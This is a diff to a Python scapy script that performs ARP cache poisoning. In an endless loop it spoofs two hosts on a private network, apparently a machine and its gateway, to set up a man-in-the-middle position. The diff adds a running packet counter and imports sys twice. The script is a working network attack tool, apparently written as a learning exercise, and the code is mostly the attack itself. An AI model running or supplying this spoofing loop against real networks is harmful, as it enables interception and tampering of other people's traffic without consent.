@@ -1,7 +1,10 @@
 #/usr/bin/env python
+import sys
+
 from scapy.layers.l2 import ARP, Ether
 import scapy.all as scapy
 import time
+import sys
 
 def get_mac(ip):
     arp_request = ARP(pdst=ip)
@@ -15,7 +18,11 @@ def spoof(target_ip, spoof_ip):
     packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet)
 
+sent_packets_count = 0
 while True:
     spoof("192.168.63.174","192.168.63.2")
     spoof("192.168.63.2","192.168.63.174")
+    sent_packets_count += 1
+    print(f"\r[+] Packet Count: " + str(sent_packets_count*2), end=""),
+    sys.stdout.flush()
     time.sleep(2)
